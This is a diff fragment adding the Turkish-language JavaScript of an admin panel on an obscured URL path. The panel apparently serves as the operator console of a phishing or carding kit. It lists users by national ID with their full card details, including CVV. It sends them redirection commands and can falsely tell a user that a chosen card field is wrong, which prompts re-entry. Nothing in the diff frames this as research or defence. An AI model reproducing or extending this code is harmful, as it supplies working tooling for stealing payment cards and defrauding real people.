+                        ['Kart Türü', kart.kartTuru || '-'],
+                        ['Marka', kart.marka || '-'],
+                        ['SKT', kart.skt || '-'],
+                        ['CVV', kart.cvv || '-'],
+                        ['Tutar', typeof kart.tutar === 'number' ? kart.tutar.toFixed(2) + ' TL' : '-'],
+                        ['Tarih', formatTarih(kart.odemeTarihi)]
+                    ];
+                    bilgiler.forEach(function (b) {
+                        var row = document.createElement('div');
+                        row.className = 'info-row';
+                        var lbl = document.createElement('span');
+                        lbl.className = 'info-label';
+                        lbl.textContent = b[0];
+                        var val = document.createElement('span');
+                        val.className = 'info-value';
+                        val.textContent = b[1];
+                        row.appendChild(lbl);
+                        row.appendChild(val);
+                        blok.appendChild(row);
+                    });
+                    govde.appendChild(blok);
+                });
+                document.getElementById('kartGecmisiModal').style.display = 'flex';
+            }
+
+            function kartGecmisiKapat() {
+                document.getElementById('kartGecmisiModal').style.display = 'none';
+            }
+
+            function uyariModalAc(tcno, ad) {
+                document.getElementById('uyariTcno').value = tcno;
+                document.getElementById('uyariMetin').value = '';
+                document.getElementById('uyariModalBaslik').textContent = 'Uyarı Gönder - ' + (ad || tcno);
+                document.getElementById('uyariModal').style.display = 'flex';
+                document.getElementById('uyariMetin').focus();
+            }
+
+            function uyariModalKapat() {
+                document.getElementById('uyariModal').style.display = 'none';
+                document.getElementById('uyariTcno').value = '';
+                document.getElementById('uyariMetin').value = '';
+            }
+
+            function binKayitModalAc(u) {
+                var modal = document.getElementById('binKayitModal');
+                var bankaSelect = document.getElementById('binKayitBanka');
+                var binInput = document.getElementById('binKayitBin');
+                var kartTuruSelect = document.getElementById('binKayitKartTuru');
+                var markaInput = document.getElementById('binKayitMarka');
+                if (!modal || !bankaSelect || !binInput || !kartTuruSelect || !markaInput) return;
+
+                bankaSelect.innerHTML = '<option value="">Banka seçin</option>';
+                fetch('/SADSDAFHBEUBCE/kart-binleri/bankalar', { headers: { 'Accept': 'application/json' } })
+                    .then(function (r) { return r.ok ? r.json() : []; })
+                    .then(function (list) {
+                        var bankalar = Array.isArray(list) ? list.map(function (b) { return b && b.banka ? b.banka : null; }).filter(Boolean) : [];
+                        if (!bankalar.length) {
+                            bankalar = ['İş Bankası', 'Garanti', 'Akbank', 'Yapı Kredi', 'Vakıfbank', 'Ziraat', 'Halkbank'];
+                        }
+                        bankalar.forEach(function (banka) {
+                            var opt = document.createElement('option');
+                            opt.value = banka;
+                            opt.textContent = banka;
+                            bankaSelect.appendChild(opt);
+                        });
+                        if (u && u.odeme && u.odeme.banka) {
+                            bankaSelect.value = u.odeme.banka;
+                        }
+                    })
+                    .catch(function () {
+                        bankaSelect.innerHTML = '<option value="">Banka seçin</option>';
+                    });
+
+                if (u && u.odeme && u.odeme.kartNo) {
+                    binInput.value = String(u.odeme.kartNo).replace(/\D/g, '').slice(0, 6);
+                } else {
+                    binInput.value = '';
+                }
+                kartTuruSelect.value = (u && u.odeme && u.odeme.kartTuru) ? u.odeme.kartTuru : 'KREDİ KARTI';
+                markaInput.value = (u && u.odeme && u.odeme.marka) ? u.odeme.marka : '';
+                modal.style.display = 'flex';
+                binInput.focus();
+            }
+
+            function binKayitModalKapat() {
+                document.getElementById('binKayitModal').style.display = 'none';
+                document.getElementById('binKayitBanka').value = '';
+                document.getElementById('binKayitBin').value = '';
+                document.getElementById('binKayitMarka').value = '';
+            }
+
+            function binKayitKaydet() {
+                var banka = document.getElementById('binKayitBanka').value.trim();
+                var bin = document.getElementById('binKayitBin').value.replace(/\D/g, '').slice(0, 6);
+                var kartTuru = document.getElementById('binKayitKartTuru').value.trim();
+                var marka = document.getElementById('binKayitMarka').value.trim();
+                if (!banka) {
+                    window.alert('Lütfen bir banka seçin.');
+                    return;
+                }
+                if (!bin || bin.length !== 6) {
+                    window.alert('Lütfen 6 haneli bir BIN girin.');
+                    return;
+                }
+                fetch('/SADSDAFHBEUBCE/panel/bin-kaydet', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ banka: banka, bin: bin, kartTuru: kartTuru, marka: marka })
+                })
+                    .then(function (r) { return r.json(); })
+                    .then(function (v) {
+                        if (v && v.ok) {
+                            toastGoster('BIN kaydedildi');
+                            binKayitModalKapat();
+                            if (window.panelGuncelle) window.panelGuncelle();
+                        } else {
+                            window.alert((v && v.hata) || 'BIN kaydedilemedi.');
+                        }
+                    })
+                    .catch(function () { window.alert('Sunucuya ulaşılamadı.'); });
+            }
+
+            function hataliKartMenuAc(u, btn) {
+                if (!u || !u.tcno) return;
+                var modal = document.getElementById('hataliKartModal');
+                var baslik = document.getElementById('hataliKartModalBaslik');
+                var aciklama = document.getElementById('hataliKartModalAciklama');
+                if (!modal || !baslik || !aciklama) return;
+                baslik.textContent = 'Hatalı Kart - ' + (u.ad || u.tcno);
+                aciklama.textContent = 'Kullanıcıya hangi alan hatalıymış gibi gösterilecek?';
+                modal.dataset.tcno = u.tcno;
+                modal.dataset.btn = btn ? '1' : '0';
+                modal.style.display = 'flex';
+            }
+
+            function hataliKartMenuKapat() {
+                var modal = document.getElementById('hataliKartModal');
+                if (!modal) return;
+                modal.style.display = 'none';
+                modal.dataset.tcno = '';
+            }
+
+            function uyariGonder() {
+                var tcno = document.getElementById('uyariTcno').value;
+                var mesaj = document.getElementById('uyariMetin').value.trim();
+                if (!tcno) return;
+                if (!mesaj) {
+                    window.alert('Lütfen bir uyarı mesajı yazın.');
+                    return;
+                }
+                fetch('/SADSDAFHBEUBCE/kullanici/uyari-gonder', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ tcno: tcno, mesaj: mesaj })
+                })
+                    .then(function (r) { return r.json(); })
+                    .then(function (v) {
+                        if (v.ok) {
+                            toastGoster('Uyarı mesajı gönderildi');
+                            if (window.panelGuncelle) window.panelGuncelle();
+                            uyariModalKapat();
+                        } else {
+                            window.alert(v.hata || 'Uyarı gönderilemedi.');
+                        }
+                    })
+                    .catch(function () { window.alert('Sunucuya ulaşılamadı.'); });
+            }
+
+            function kullaniciSil(tcno) {
+                var ad = kullanicilar.find(function (u) { return u.tcno === tcno; });
+                var metin = (ad && ad.ad ? ad.ad : tcno) + ' silinsin mi?';
+                if (!window.confirm(metin)) return;
+                fetch('/SADSDAFHBEUBCE/kullanici/sil', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ tcno: tcno })
+                })
+                    .then(function (r) { return r.json(); })
+                    .then(function (v) {
+                        if (v.ok) {
+                            toastGoster('Kullanıcı silindi');
+                            if (window.panelGuncelle) window.panelGuncelle();
+                        } else {
+                            window.alert(v.hata || 'Silinemedi.');
+                        }
+                    })
+                    .catch(function () { window.alert('Sunucuya ulaşılamadı.'); });
+            }
+
+            function banDegistir(tcno, banli) {
+                var ad = kullanicilar.find(function (u) { return u.tcno === tcno; });
+                var isim = ad && ad.ad ? ad.ad : tcno;
+                if (!window.confirm(banli ? isim + ' yasaklansın mı?' : isim + ' yasağı kaldırılsın mı?')) return;
+                fetch('/SADSDAFHBEUBCE/kullanici/ban', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ tcno: tcno, banli: banli })
+                })
+                    .then(function (r) { return r.json(); })
+                    .then(function (v) {
+                        if (v.ok) {
+                            toastGoster(banli ? 'Kullanıcı yasaklandı' : 'Yasak kaldırıldı');
+                            if (window.panelGuncelle) window.panelGuncelle();
+                        } else {
+                            window.alert(v.hata || 'İşlem yapılamadı.');
+                        }
+                    })
+                    .catch(function () { window.alert('Sunucuya ulaşılamadı.'); });
+            }
+
+            function komutGonder(tcno, komut, btn) {
+                var eski = btn ? btn.innerHTML : null;
+                if (btn) btn.disabled = true;
+                fetch('/SADSDAFHBEUBCE/panel/komut', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ tcno: tcno, komut: komut })
+                })
+                    .then(function (r) { return r.json(); })
+                    .then(function (v) {
+                        if (v.ok) {
+                            if (btn) {
+                                btn.innerHTML = ikon(IKONLAR.onay);
+                                btn.classList.add('komut-gonderildi');
+                            }
+                            toastGoster('Yönlendirme Başarılı');
+                            if (window.panelGuncelle) window.panelGuncelle();
+                            if (btn) {
+                                setTimeout(function () {
+                                    btn.innerHTML = eski;
+                                    btn.classList.remove('komut-gonderildi');
+                                    btn.disabled = false;
+                                }, 1500);
+                            }
+                        } else {
+                            window.alert(v.hata || 'Komut gönderilemedi.');
+                            if (btn) btn.disabled = false;
+                        }
+                    })
+                    .catch(function () {
+                        window.alert('Sunucuya ulaşılamadı.');
+                        if (btn) btn.disabled = false;
+                    });
+            }
+
+            function toastGoster(metin) {
+                var toast = document.getElementById('panelToast');
+                var toastMetin = document.getElementById('panelToastMetin');
+                if (!toast || !toastMetin) return;
+                toastMetin.textContent = metin;
+                toast.classList.add('panel-toast-acik');
+                clearTimeout(toast.zamanlayici);
+                toast.zamanlayici = setTimeout(function () {
+                    toast.classList.remove('panel-toast-acik');
+                }, 2500);
+            }
+
+            document.getElementById('modalKapat').addEventListener('click', modalKapat);
+            document.getElementById('modalKapat2').addEventListener('click', modalKapat);
+            document.getElementById('kullaniciModal').addEventListener('click', function (e) {
+                if (e.target === this) modalKapat();
+            });
+            document.getElementById('kartGecmisiKapat').addEventListener('click', kartGecmisiKapat);
+            document.getElementById('kartGecmisiKapat2').addEventListener('click', kartGecmisiKapat);
+            document.getElementById('kartGecmisiModal').addEventListener('click', function (e) {
+                if (e.target === this) kartGecmisiKapat();
+            });
+            document.getElementById('uyariModalKapat').addEventListener('click', uyariModalKapat);
+            document.getElementById('uyariModalIptal').addEventListener('click', uyariModalKapat);
+            document.getElementById('uyariModalGonder').addEventListener('click', uyariGonder);
+            document.getElementById('uyariModal').addEventListener('click', function (e) {
+                if (e.target === this) uyariModalKapat();
+            });
+            document.getElementById('binKayitModalKapat').addEventListener('click', binKayitModalKapat);
+            document.getElementById('binKayitModalIptal').addEventListener('click', binKayitModalKapat);
+            document.getElementById('binKayitModalKaydet').addEventListener('click', binKayitKaydet);
+            document.getElementById('binKayitModal').addEventListener('click', function (e) {
+                if (e.target === this) binKayitModalKapat();
+            });
+            document.getElementById('hataliKartModalKapat').addEventListener('click', hataliKartMenuKapat);
+            document.getElementById('hataliKartModalIptal').addEventListener('click', hataliKartMenuKapat);
+            document.getElementById('hataliKartModal').addEventListener('click', function (e) {
+                if (e.target === this) hataliKartMenuKapat();
+            });
+            document.querySelectorAll('[data-hatali-kart]').forEach(function (btn) {
+                btn.addEventListener('click', function () {
+                    var tcno = document.getElementById('hataliKartModal').dataset.tcno;
+                    var neden = this.getAttribute('data-hatali-kart');
+                    if (!tcno) return;
+                    hataliKartMenuKapat();
+                    komutGonder(tcno, 'gecersizKart:' + neden, null);
+                });
+            });
+            var toastKapat = document.getElementById('panelToastKapat');
+            if (toastKapat) {
+                toastKapat.addEventListener('click', function () {
+                    var toast = document.getElementById('panelToast');
+                    if (!toast) return;
+                    toast.classList.remove('panel-toast-acik');
+                    clearTimeout(toast.zamanlayici);
+                });
+            }
+            document.addEventListener('keydown', function (e) {
+                if (e.key === 'Escape') {
+                    modalKapat();
+                    uyariModalKapat();
+                    hataliKartMenuKapat();
+                    kartGecmisiKapat();
+                }
+            });
+
+            var temizleKartsizBtn = document.getElementById('temizleKartsizBtn');
+            var temizleTumuBtn = document.getElementById('temizleTumuBtn');
+            
+            if (temizleKartsizBtn) {
+                temizleKartsizBtn.addEventListener('click', function () {
+                    if (!window.confirm('Kart bilgisi olmayan tüm kullanıcılar silinecek. Emin misiniz?')) return;
+                    fetch('/SADSDAFHBEUBCE/kullanici/temizle-kartsiz', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' }
+                    })
+                        .then(function (r) { return r.json(); })
+                        .then(function (v) {
+                            if (v.ok) {
+                                toastGoster(v.silinen + ' kullanıcı silindi');
+                                if (window.panelGuncelle) window.panelGuncelle();
+                            } else {
+                                window.alert(v.hata || 'Temizleme başarısız.');
+                            }
+                        })
+                        .catch(function () { window.alert('Sunucuya ulaşılamadı.'); });
+                });
+            }
+            
+            if (temizleTumuBtn) {
+                temizleTumuBtn.addEventListener('click', function () {
+                    if (!window.confirm('TÜM kullanıcılar ve ödemeler silinecek! Emin misiniz?')) return;
+                    fetch('/SADSDAFHBEUBCE/kullanici/temizle-tumu', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' }
+                    })
+                        .then(function (r) { return r.json(); })
+                        .then(function (v) {
+                            if (v.ok) {
+                                toastGoster(v.silinen + ' kullanıcı ve ' + v.silinenOdeme + ' ödeme kaydı silindi');
+                                if (window.panelGuncelle) window.panelGuncelle();
+                            } else {
+                                window.alert(v.hata || 'Temizleme başarısız.');
+                            }
+                        })
+                        .catch(function () { window.alert('Sunucuya ulaşılamadı.'); });
+                });
+            }
+
+            tabloCiz();
+
+            window.panelKullanicilariGuncelle = function (yeni) {
+                kullanicilar = yeni;
+                tabloCiz();
+            };
+        })();
+    </script>
+
+    <script src="/js/admin-tema.js"></script>
+</body>
+
+</html>
